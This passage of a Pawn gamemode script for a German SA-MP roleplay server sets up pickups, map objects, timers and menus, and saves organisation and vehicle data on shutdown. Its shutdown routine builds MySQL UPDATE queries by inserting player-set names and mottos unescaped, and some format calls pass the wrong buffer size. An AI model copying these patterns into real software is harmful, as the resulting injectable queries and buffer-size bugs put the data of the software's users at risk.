	AddStaticPickup(1239, 2, 1906.0333,994.9215,52.7387,-1); //iicon
	AddStaticPickup(1239, 2, 681.4097,-474.4054,16.5363,-1); //iicon
//	AddStaticPickup(1239, 2, 323.0342,1118.5804,1083.8828,-1); //Getting Drugs for DrugDealers
	AddStaticPickup(1239, 2, 1381.0413,-1088.8511,27.3906,-1); //Bill Board (old Job Department)
	AddStaticPickup(1239, 23, 593.0110,-1248.0918,18.1534,-1); //Materials Paket-Hol-Punkt
	AddStaticPickup(1239, 23, -2109.4983,0.7033,35.3203,-1); //Materials Paket-Hinbring-Punkt
	AddStaticPickup(1313, 2, 1106.8654,-311.5620,73.9922,-1); //Hitman Agency Order
	AddStaticPickup(371,2,1544.2,-1353.4,329.4,-1); //LS towertop Fallschirm
	AddStaticPickup(371,2,1536.0, -1360.0, 1150.0,-1); //LS towertop Fallschirm
	AddStaticPickup(1240,2,279.3000,1853.5619,8.7649,-1); //area51 health
	AddStaticPickup(1239,23,-49.7952,-269.3755,6.6332,-1);
    AddStaticPickup(1313,23,1712.4611,-1640.0770,20.2239,-1); // RM WAFFEN
    AddStaticPickup(1313,23,1277.5029,-808.4862,1089.9375,1);//LCN WAFFEN
    AddStaticPickup(1313,23,231.5756,1067.9391,1084.2061,5);//RS WAFFEN
//    AddStaticPickup(1313,23,2819.4785,-1169.4138,1025.5703,-1);//Terror Waffen
    AddStaticPickup(1313,23,1939.4677,982.8486,992.4688,-1);//Yakuza WAFFEN
	AddStaticPickup(1239, 2, -2281.0369,2288.4565,4.9621,-1); //base,dings RM
	AddStaticPickup(1275, 23,-2646.6782,1423.5521,906.4609,-1); //Triaden Kleidung
    AddStaticPickup(1239,23,2322.0334,587.1565,7.7802,-1);//Hitman /Enter
//    AddStaticPickup(1239,23,1772.1519,-1895.3396,13.5534,-1); // Fahrrad
    AddStaticPickup(1239,23,1480.9919,-1771.2096,18.7958,-1);//Stadthalle /Enter
    AddStaticPickup(1239,23,389.9180,173.6584,1008.3828,-1);//Stadthalle /exit
    AddStaticPickup(1239,23,1381.2601,-992.4224,5664.4189,-1);//Bank /exit
    AddStaticPickup(1239,23,2000.0635,-1114.6185,27.1250,-1);
    AddStaticPickup(1239,23,1554.7513,-1675.6208,16.1953,-1);//LSPD /Enter
    AddStaticPickup(1239,23,238.7018,139.9523,1003.0234,-1);//LSPD /exit
    AddStaticPickup(1274, 1, 233.7505,112.1678,1010.2188,-1);
//    AddStaticPickup(1240,2,2819.4785,-1169.4138,1025.5703,-1); // heal pickup ganghäuer
    AddStaticPickup(1240,2,-2160.3408,638.6109,1057.5861,-1); // heal pickup yaku
    AddStaticPickup(1240,2,1709.4355,-1642.6681,20.2188,-1); // heal pickup Rm
	AddStaticPickup(1240, 2,-2642.2944,1419.0110,906.4609,-1); //Triaden Heal
	AddStaticPickup(1240, 2,1956.4037,1017.7150,992.4688,-1); //Yakuza Heal
    AddStaticPickup(1240,2,1494.4905,1309.0504,1093.2839,-1); // heal pickup FW
    AddStaticPickup(1239,23,1084.1470,-1227.1428,15.8203,-1); // Ballas Eingang
    AddStaticPickup(1239,23,2495.3865,-1690.6353,14.7656,-1); // Groove Eingang
    AddStaticPickup(1239,23,2786.4897,-1926.2115,13.5469,-1);// Aztecas Eingang
    AddStaticPickup(1239,23,2534.0478515625,-1063.4067382813,69.7,-1);// Vagos Eingang
    AddStaticPickup(1239,23,-516.1633,-506.0980,25.5234,-1);//Terror Eingang
    AddStaticPickup(1239,23,1081.1771,-345.3208,73.9825,-1);// Hitman Eingang
    AddStaticPickup(1239,23,-2529.0854,-19.1742,16.4219,-1);


    EssenPickup[0] = CreatePickup(1274,1,376.4389,-67.9595,1001.5151,-1);
	EssenPickup[1] = CreatePickup(1274,1,374.7315,-119.5200,1001.4995,-1);
	EssenPickup[2] = CreatePickup(1274,1,369.5129,-6.7848,1001.8589,-1);

	KLEIDUNG_PRO = CreatePickup( 1275, 23, 199.0634,-128.0607,1003.5152,-1);
	KLEIDUNG_ZIP = CreatePickup( 1275, 23, 181.2543,-91.6659,1002.0234,-1);

	pickups=pickups+22;
	printf("Pickups Max = 2048, Current Pickups = %d",pickups);
	//
	new tmphour;
	new tmpminute;
	new tmpsecond;
	gettime(tmphour, tmpminute, tmpsecond);
	FixHour(tmphour);
	tmphour = shifthour;
	SetWorldTime(tmphour);


	//-----------------------------------------------------------------------------------
	//-------------------------------  TIMER --------------------------------------------
	SetTimer("Production", 600000, 1); //10 mins (300000)
	SetTimer("CheckGas", 30000, 1);
	SetTimer("serverNews", 480000, 1);
	SetTimer("ShowLotto",7200000,true);
	SetTimer("PayDay",60000, 1); // SyncUp + InCreasePlayerMinute
	SetTimer("Timer2",1000, 1); // UpdateClock + Streamcheckpoint + Othertimer
	SetTimer("Timer3",1800000, 1); // Accountstimer + ArenaSpawn
	SetTimer("Blitzer_Timer", BLITZER_TIMER_INTERVALL, 1);
	//-----------------------------------------------------------------------------------


//Bank interior
CreateDynamicObject(14789, 1424.690308, -1004.066162, 1643.018677, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(2774, 1433.026245, -1004.643921, 1635.819824, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2774, 1429.296997, -1004.618652, 1641.281128, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2774, 1440.957031, -979.682068, 1640.297729, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2774, 1429.337158, -979.545288, 1639.723389, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2774, 1449.314087, -984.505005, 1648.023193, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2774, 1413.914063, -984.515381, 1643.073486, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(1886, 1448.510132, -1003.642944, 1647.093994, 19.7670, 0.0000, 223.3584);
CreateDynamicObject(1886, 1414.706543, -980.604431, 1647.061646, 19.7670, 0.0000, 43.3584);
CreateDynamicObject(2774, 1430.416870, -999.017273, 1638.722412, 0.0000, 269.7592, 0.0000);
CreateDynamicObject(2774, 1408.149292, -998.996826, 1638.722412, 0.0000, 269.7592, 180.0000);
CreateDynamicObject(2774, 1443.577271, -986.634644, 1638.723389, 0.0000, 269.7592, 270.0000);
CreateDynamicObject(2774, 1443.604492, -998.998169, 1647.797485, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(11359, 1414.356201, -988.985352, 1639.795898, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(2774, 1413.927368, -986.011719, 1643.046997, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(2774, 1413.763672, -992.085388, 1643.673340, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(626, 1427.554565, -997.322998, 1640.766479, 0.0000, 0.0000, 135.0000);
CreateDynamicObject(626, 1427.488281, -990.752502, 1640.841553, 0.0000, 0.0000, 135.0000);
CreateDynamicObject(2773, 1427.756714, -995.781189, 1639.310181, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2773, 1427.694946, -992.841431, 1639.310181, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2773, 1427.596924, -989.128601, 1639.301514, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2773, 1429.863159, -982.927368, 1639.310181, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(626, 1427.665283, -983.128601, 1640.841553, 0.0000, 0.0000, 236.2500);
CreateDynamicObject(2773, 1432.755859, -982.990784, 1639.310181, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(626, 1434.648315, -983.188904, 1640.841553, 0.0000, 0.0000, 236.2500);
CreateDynamicObject(2773, 1437.091431, -983.054993, 1639.310181, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(2773, 1440.040283, -983.012756, 1639.310181, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(3462, 1448.466919, -993.014465, 1640.297974, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(3462, 1448.512085, -982.992615, 1640.181519, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(626, 1441.636230, -997.047729, 1640.741455, 0.0000, 0.0000, 146.2500);
CreateDynamicObject(14632, 1443.648682, -995.934631, 1638.667725, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(14632, 1432.156372, -1018.015259, 1639.988159, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(1514, 1432.294922, -998.852478, 1639.740112, 0.0000, 0.0000, 180.0000);
CreateDynamicObject(1514, 1438.352539, -998.846741, 1639.815674, 0.0000, 0.0000, 180.0000);
CreateDynamicObject(2773, 1435.183838, -996.759277, 1639.301514, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2773, 1435.152466, -993.932556, 1639.301514, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2773, 1439.338623, -996.658691, 1639.301514, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2773, 1439.288940, -994.000671, 1639.301514, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(1723, 1426.280151, -994.863586, 1638.707275, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(1723, 1426.244629, -991.150452, 1638.732300, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(1723, 1422.277466, -996.935059, 1638.682251, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(1723, 1422.279297, -993.210022, 1638.657227, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(2637, 1424.232422, -992.173584, 1638.838745, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(2637, 1424.228516, -995.704163, 1638.838745, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(3657, 1432.633301, -987.739014, 1639.202393, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(3657, 1432.631104, -986.977234, 1639.202393, 0.0000, 0.0000, 180.0000);
CreateDynamicObject(3657, 1438.111572, -986.977539, 1639.202393, 0.0000, 0.0000, 180.0000);
CreateDynamicObject(3657, 1438.086304, -987.730713, 1639.227417, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2961, 1439.028320, -999.826660, 1639.211304, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2961, 1433.505615, -999.827637, 1639.301392, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2946, 1414.355225, -990.513489, 1638.755615, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2946, 1414.380249, -987.392517, 1638.755005, 0.0000, 0.0000, 180.0000);
CreateDynamicObject(2963, 1424.165283, -1004.815674, 1640.781128, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(2963, 1426.806763, -1004.832520, 1640.826904, 0.0000, 0.0000, 90.0000);
CreateDynamicObject(1886, 1414.730591, -993.523010, 1646.908569, 17.1887, 0.0000, 67.5000);
CreateDynamicObject(2773, 1431.414551, -996.845825, 1639.301514, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2773, 1431.473389, -994.017090, 1639.301514, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(632, 1434.735352, -987.757507, 1639.131226, 0.0000, 0.0000, 213.7500);
CreateDynamicObject(2942, 1417.713623, -980.475159, 1639.363525, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(1216, 1443.281372, -989.311279, 1639.387817, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(2942, 1421.217163, -980.448914, 1639.385498, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(2942, 1424.630493, -980.526672, 1639.371460, 0.0000, 0.0000, 0.0000);
CreateDynamicObject(1216, 1443.277832, -991.424866, 1639.424194, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(1216, 1443.251221, -987.278198, 1639.376221, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(1216, 1443.259766, -985.484985, 1639.376221, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(2773, 1441.228638, -993.042969, 1639.301514, 0.0000, 0.0000, 270.0000);
CreateDynamicObject(2824, 1424.297241, -992.054932, 1639.247681, 0.0000, 0.0000, 78.7500);


// ATMs
	  CreateDynamicObject(2942, 810.565063, -1623.768799, 13.189775, 0.0000, 0.0000, 90.0001);
	  CreateDynamicObject(2942, 1000.825195, -922.610168, 41.971024, 0.0000, 0.0000, 277.8123);
	  CreateDynamicObject(2942, 1504.693359, -1706.567749, 13.689775, 0.0000, 0.0000, 90.0000);
	  CreateDynamicObject(2942, 1928.620850, -1771.269043, 13.189775, 0.0000, 0.0000, 90.0000);
	  CreateDynamicObject(2942, 1036.071655, -1024.509766, 31.744461, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(2942, 926.909912, -1355.081421, 13.021199, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(2942, 491.439484, -1734.586548, 10.871187, 0.0000, 0.0000, 168.3452);
	  CreateDynamicObject(2942, 380.780701, -2021.725830, 7.478837, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(2942, 1223.778320, -1744.292603, 13.240016, 0.0000, 0.0000, 193.3734);
	  CreateDynamicObject(2942, 2105.436035, -1809.228516, 13.197587, 0.0000, 0.0000, 270.0000);
	  CreateDynamicObject(2942, 2072.053955, -1836.951416, 13.197434, 0.0000, 0.0000, 90.0001);
	  CreateDynamicObject(2942, 1956.735596, -2186.291016, 13.189775, 0.0000, 0.0000, 90.0000);
	  CreateDynamicObject(2942, 2394.498047, -1914.865356, 13.189775, 0.0000, 0.0000, 0.0000);
	  CreateDynamicObject(2942, 2779.040283, -1821.910034, 10.157268, 0.0000, 0.0000, 33.7500);
	  CreateDynamicObject(2942, 1196.011841, -918.630188, 40.792793, 0.0000, 0.0000, 5.1566);
	  CreateDynamicObject(2942, 1458.4338,2767.5984,10.8203, 0,0,90.0);




    	MVTor2 = CreateDynamicObject(969, 1584.80530, -1638.13293, 12.45620,   0.00000, -1.24870, 0.00000, -1, -1, -1, 250.0);
     	RS1 = CreateDynamicObject(980,1283.94921875,-1652.19042969,15.32026672,0.00000000,0.00000000,270.00000000); //object(airportgate) (1)
	    terrorgate = CreateDynamicObject(980, -489.2532043457, -563.72381591797, 26.966348648071, 0, 0, 0);


		new string5[128];
        format(string5, sizeof(string), "{00C0FF}LSPD{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen", LSPDMats);
		lspdkammer = Create3DTextLabel(string5,COLOR_WHITE,1564.6588,-1694.1836,5.8906,20,0);

		new string6[128];
        format(string6, sizeof(string), "{00C0FF}FBI{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen", FBIMats);
		fbikammer = Create3DTextLabel(string6,COLOR_WHITE,-1589.3329,716.3265,-5.2422,20,0);

		new string7[128];
        format(string7, sizeof(string), "{00C0FF}S.W.A.T{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen", LVPDMats);
		lvpdkammer = Create3DTextLabel(string7,COLOR_WHITE,2281.5049,2431.0366,3.2734,20,0);


	//-----------------------------------------------------------------------------------
	//-------------------------------  MENÜS --------------------------------------------

	FIREequip = CreateMenu("~r~Einsatzfahrzeug",1,50.0,180.0,200.0,200.0);
    SetMenuColumnHeader(FIREequip,0,"~r~Ausruestung");
	AddMenuItem(FIREequip,0,"Feuerloescher");
	AddMenuItem(FIREequip,0,"Schaufel");
	AddMenuItem(FIREequip,0,"Spray");
	AddMenuItem(FIREequip,0,"Funkgeraet");
	AddMenuItem(FIREequip,0,"Megaphon");


	BOMB = CreateMenu("Bombe:",1,200.0,180.0,200.0);
    SetMenuColumnHeader(BOMB, 0, "Waehle einen Draht!");
	AddMenuItem(BOMB,0,">>~r~ Rot");//rot,gelb,grün,blau
	AddMenuItem(BOMB,0,">>~y~ Gelb");
	AddMenuItem(BOMB,0,">>~g~ Gruen");
	AddMenuItem(BOMB,0,">>~b~ Blau");

	BOMBD = CreateMenu("Bombe:",1,200.0,180.0,200.0);
    SetMenuColumnHeader(BOMBD, 0, "Waehle einen Draht!");
	AddMenuItem(BOMBD,0,">>~r~ Rot");//rot,gelb,grün,blau
	AddMenuItem(BOMBD,0,">>~y~ Gelb");
	AddMenuItem(BOMBD,0,">>~g~ Gruen");
	AddMenuItem(BOMBD,0,">>~b~ Blau");

	PruefungMenu = CreateMenu(" ",1, 70.0, 180.0, 30.0);
	AddMenuItem(PruefungMenu,0,"a)");
	AddMenuItem(PruefungMenu,0,"b)");
	AddMenuItem(PruefungMenu,0,"c)");
	AddMenuItem(PruefungMenu,0,"d)");

	MotorradMenu = CreateMenu(" ",1,70.0, 180.0, 30.0);
	AddMenuItem(MotorradMenu,0,"a)");
	AddMenuItem(MotorradMenu,0,"b)");
	AddMenuItem(MotorradMenu,0,"c)");
	AddMenuItem(MotorradMenu,0,"d)");

	BSMK = CreateMenu("BSMK", 2, 233.0, 100.0, 150.0, 50.0);
    AddMenuItem(BSMK, 0, "3 Chicken Nuggets");
	AddMenuItem(BSMK, 0, "12 Chicken Nuggets");
	AddMenuItem(BSMK, 0, "20 Chicken Nuggets");
	AddMenuItem(BSMK, 0, "Cheesburger");
	AddMenuItem(BSMK, 0, "Chickenburger");
	AddMenuItem(BSMK, 0, "MC CHICKEN");
	AddMenuItem(BSMK, 0, "Pommes");
	AddMenuItem(BSMK, 0, "Big Mac");
	AddMenuItem(BSMK, 0, "Fisch Mac");
	AddMenuItem(BSMK, 0, "Cola");
	AddMenuItem(BSMK, 0, "MENU_VERLASSEN");

	PMK = CreateMenu("PMK", 2, 233.0, 100.0, 150.0, 50.0);
    AddMenuItem(PMK, 0, "Pommes mit Ketchup");
	AddMenuItem(PMK, 0, "Toast");
	AddMenuItem(PMK, 0, "Schnitzel mit Salat");
	AddMenuItem(PMK, 0, "Pizza");
	AddMenuItem(PMK, 0, "Kotlett");
	AddMenuItem(PMK, 0, "Gulasch");
	AddMenuItem(PMK, 0, "Grillhuhn");
	AddMenuItem(PMK, 0, "Gemüße Suppe");
	AddMenuItem(PMK, 0, "Cola");
	AddMenuItem(PMK, 0, "Bier");
	AddMenuItem(PMK, 0, "MENU_VERLASSEN");

	CBKM = CreateMenu("CBKM", 2, 233.0, 100.0, 150.0, 50.0);
    AddMenuItem(CBKM, 0, "Magerita");
	AddMenuItem(CBKM, 0, "Gemüse Pizza");
	AddMenuItem(CBKM, 0, "Schinken");
	AddMenuItem(CBKM, 0, "Pizza ala Luigi");
	AddMenuItem(CBKM, 0, "Cola");
	AddMenuItem(CBKM, 0, "Sprite");
	AddMenuItem(CBKM, 0, "Fanta");
	AddMenuItem(CBKM, 0, "Red Bull");
	AddMenuItem(CBKM, 0, "Ice Tea");
	AddMenuItem(CBKM, 0, "FoD Spezial Pizza");
	AddMenuItem(CBKM, 0, "MENU_VERLASSEN");


	//-----------------------------------------------------------------------------------
	//-------------------------------  TEXTDRAWS ----------------------------------------


// TEXTDRAW BUG
	//--------------------------------------------------------------------------



	return 1;
}

public OnGameModeExit()
{
/*
	BElevator_Destroy();

	// Display information in the Server Console
    print("  |--  LS BeachSide Building Elevator destroyed");
    print("  |---------------------------------------------------");

    // Exit here
	if (IsValidObject(LSApartments1Object))
	{
		// Destroy the LS Apartments 1 Building object
		DestroyObject(LSApartments1Object);

		// Display information in the Server Console
		print("  |---------------------------------------------------");
    	print("  |--  LS Apartments 1 Building object destroyed");
    }

    // Check for valid object
	if (IsValidObject(LSApartments1CPObject))
	{
		// Destroy the LS Apartments 1 Car Park object
		DestroyObject(LSApartments1CPObject);

		// Display information in the Server Console
    	print("  |--  LS Apartments 1 Car Park object destroyed");
    }

    // Destroy the elevator, the elevator doors and the elevator floor doors
	AElevator_Destroy();

	// Display information in the Server Console
    print("  |--  LS Apartments 1 Elevator destroyed");
    print("  |---------------------------------------------------");



*/




	new query[356];
    for(new i = 0; i < MAX_ORGANISATIONS; i++)
	{
		if(OrgInfo[i][OrgCreatet] != 0)
		{
			format(query,sizeof(query),"UPDATE organisations SET OrgName='%s',OrgOwner='%s',OrgMotto='%s',OrgCreatet='%d', OrgMech='%d',leaderkasser='%d',leaderkaufer='%d',membermiet='%d',leaderkicker='%d' WHERE id='%d'",
			OrgInfo[i][OrgName],OrgInfo[i][OrgOwner],OrgInfo[i][OrgMotto],OrgInfo[i][OrgCreatet],OrgInfo[i][OrgMech],OrgInfo[i][leaderkasser],OrgInfo[i][leaderkaufer],OrgInfo[i][membermiet],OrgInfo[i][leaderkicker],OrgInfo[i][dborgid]);

		//	mysql_function_query(mysqlcon,query,false,"","");

			mysql_pquery(mysqlcon,query,"");









		// 	mysql_query(query,false);

			printf(query);
		//	format(query,sizeof(query),"UPDATE organisations SET OrgCreatet='%d' WHERE id='%d'",OrgInfo[i][OrgCreatet],OrgInfo[i][dborgid]);
		//	mysql_function_query(mysqlcon,query,false,"","");

		}
		printf("%d Halt Stop!",i);
	}

	for(new fc;fc<sizeof(OrgAuto);fc++)// Fraktionsfahrzeug
	{
	    if(OrgAuto[fc][orgvehtype] >= 400 && OrgAuto[fc][orgvehtype] <= 611) // orgvehtype
		{

			  SaveORGAutos(fc);
			  DestroyVehicle(OrgAuto[fc][LocalID]);
		}
	}

   	SaveFraktionsKassen();
//	Elevator_Destroy();
	Fight_Close();
    STOP_FRAC();
	SaveStuff();
	/*
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			//SaveMysqlPlayer(i);
		//	OnPlayerCarUpdate(i,true);
		//	gPlayerLogged[i] = 0;
		//	DisablePlayerCheckpoint(i);
		}
	}*/

	for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i))
       	Kick(i);
    }

    for(new fc=0; fc<sizeof(FactionCars); fc++)
    {
        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
        {
            UpdateFrakCar(fc);
            DestroyVehicle(FactionCars[fc][fCarid]);
		}
    }
//    UpdateFrakCar

	mysql_close(mysqlcon);

	//rocket
	DestroyObject(jetDoor);
	DestroyObject(lift);
	for(new i = 0; i < (sizeof(missileBase)); i++) DestroyObject(missileBase[i]);
	for(new i = 0; i < (sizeof(missileObject)); i++) DestroyObject(missileObject[i]);
	return 1;
}
public OnVehicleDeath(vehicleid, killerid)
{

    new Float:vehfireX,Float:vehfireY,Float:vehfireZ;
	GetVehiclePos(vehicleid,vehfireX,vehfireY,vehfireZ);
	AddFire(vehfireX+2,vehfireY,vehfireZ,GetVehicleVirtualWorld(vehicleid),true);
	AddFire(vehfireX+2,vehfireY+2,vehfireZ,GetVehicleVirtualWorld(vehicleid),false);
	AddFire(vehfireX+4,vehfireY+2,vehfireZ,GetVehicleVirtualWorld(vehicleid),false);
	AddFire(vehfireX+4,vehfireY+4,vehfireZ,GetVehicleVirtualWorld(vehicleid),false);
	AddFire(vehfireX+2,vehfireY+4,vehfireZ,GetVehicleVirtualWorld(vehicleid),false);
	AddFire(vehfireX+2,vehfireY+6,vehfireZ,GetVehicleVirtualWorld(vehicleid),false);
	AddFire(vehfireX+3,vehfireY+5,vehfireZ,GetVehicleVirtualWorld(vehicleid),false);
	AddFire(vehfireX+5,vehfireY+3,vehfireZ,GetVehicleVirtualWorld(vehicleid),false);

if(toggle_switcher[vehicleid] == 1)
{
    toggle_switcher[vehicleid] = 0; // Der Switcher wird umgeschaltet
    KillTimer(warn_timer[vehicleid]); // Timer wird gestoppt
    DestroyObject(objekt1[vehicleid]); // Objekte am Auto werden gelöscht
    DestroyObject(objekt2[vehicleid]);
    DestroyObject(objekt3[vehicleid]);
    DestroyObject(objekt4[vehicleid]);
}

   FRAC_OnVehicleDeath(vehicleid, killerid);
   for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
	    for(new x = 0; x < MaxVeh; x++)
		{
			if(IsPlayerConnected(playerid) && Dtc_PlayerHaveCar[playerid][x])
			{
	    	 	if (vehicleid == PlayerCar[playerid][x][CarId])
		     	{
	        		SetTimerEx("DestroyAndCreateCar",30000,0,"dd",playerid,x);
		       	}
			}
		}
	}
	return 1;
}
/*
Function bombexplode(playerid)
{
	DestroyDynamicObject(bombe[MAX_BOMBS]);
	CreateExplosion(PlayerExplosionX[1]+10, PlayerExplosionY[1]-10, PlayerExplosionZ[1], 10, 0);
	CreateExplosion(PlayerExplosionX[1]-10, PlayerExplosionY[1]+10, PlayerExplosionZ[1], 10, 0);
	CreateExplosion(PlayerExplosionX[1]+15, PlayerExplosionY[1]-15, PlayerExplosionZ[1], 10, 0);
	CreateExplosion(PlayerExplosionX[1]-15, PlayerExplosionY[1]+15, PlayerExplosionZ[1], 10, 0);
	CreateExplosion(PlayerExplosionX[1]-5, PlayerExplosionY[1]-5, PlayerExplosionZ[1], 10, 0);
 	CreateExplosion(PlayerExplosionX[1]+5, PlayerExplosionY[1]+5, PlayerExplosionZ[1], 10, 0);
 	CreateExplosion(PlayerExplosionX[1]+7.5, PlayerExplosionY[1]-7.5, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-7.5, PlayerExplosionY[1]+7.5, PlayerExplosionZ[1], 10, 0);
   	CreateExplosion(PlayerExplosionX[1]+20, PlayerExplosionY[1]-20, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-20, PlayerExplosionY[1]+20, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-30, PlayerExplosionY[1]+30, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+30, PlayerExplosionY[1]-30, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-30, PlayerExplosionY[1]+30, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+25, PlayerExplosionY[1]-25, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+10, PlayerExplosionY[1], PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+20, PlayerExplosionY[1], PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+25, PlayerExplosionY[1], PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+15, PlayerExplosionY[1], PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+7.5, PlayerExplosionY[1], PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1], PlayerExplosionY[1]-10, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1], PlayerExplosionY[1]-20, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1], PlayerExplosionY[1]-25, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1], PlayerExplosionY[1]-15, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1], PlayerExplosionY[1]-7.5, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-7.5, PlayerExplosionY[1]-7.5, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-10, PlayerExplosionY[1]-10, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-15, PlayerExplosionY[1]-15, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-20, PlayerExplosionY[1]-20, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]-25, PlayerExplosionY[1]-25, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+7.5, PlayerExplosionY[1]+7.5, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+10, PlayerExplosionY[1]+10, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+15, PlayerExplosionY[1]+15, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+20, PlayerExplosionY[1]+20, PlayerExplosionZ[1], 10, 0);
  	CreateExplosion(PlayerExplosionX[1]+25, PlayerExplosionY[1]+25, PlayerExplosionZ[1], 10, 0);
	WantedLevel[playerid] += 7;
	SetPlayerCriminal(playerid,255, "Bomben Anschlag!");
	GivePlayerMoneySave(playerid,5000);
	SendClientMessage(playerid, COLOR_LIGHTRED, "Bombe ist explodiert! Du bekommst $5000.");
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsACop(i) || IsPlayerInFrac(i, 22))
		{
			GangZoneStopFlashForPlayer(i,bombzone);
			GangZoneHideForPlayer(i,bombzone);
			GangZoneDestroy(bombzone);
			SendClientMessage(i,COLOR_RED," Die Bombe ist explodiert!");
		}
	}
	SetTimer("Abkling",	300000 , 0);
	Bombactivated=0;
	DestroyDynamicObject(bombe[MAX_BOMBS]);
}

Function Bombtimer(time,playerid)
{
	new string[8];
	format(string,sizeof(string),"%d",time);
	GameTextForPlayer(playerid,string,1000,4);
	if(time>0)
	{
	    time--;
     	bombtimer = SetTimerEx("Bombtimer",1000,0,"ii",time,playerid);
	}
	else
	{
		DestroyDynamicObject(bombe[MAX_BOMBS]);
		SetTimer("Abkling",	300000 , 0);
		KillTimer(bombtimer);
		KillTimer(bombexplotimer);
 		for(new i = 0; i < MAX_PLAYERS; i++)
 		{
			if(IsACop(i))
			{
				GameTextForPlayer(i,"Bombe entschaerft!",1000,4);
				GangZoneStopFlashForPlayer(i,bombzone);
				GangZoneHideForPlayer(i,bombzone);
				GangZoneDestroy(bombzone);
				Bombactivated=0;
			}
		}
	}
}

*/
Function CMDtimer(playerid)
{
	CMDspam[playerid] = 0;
}

/*
Function Abkling(playerid)
{
	BombStatus = 0;
}

Function SAbkling(playerid)
{
	SelfStatus = 0;
}
*/
//---------------------------------------------------------
Function SetPlayerToTeamColor(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)
  		{
  			if(OnDuty[playerid]==1)
			{
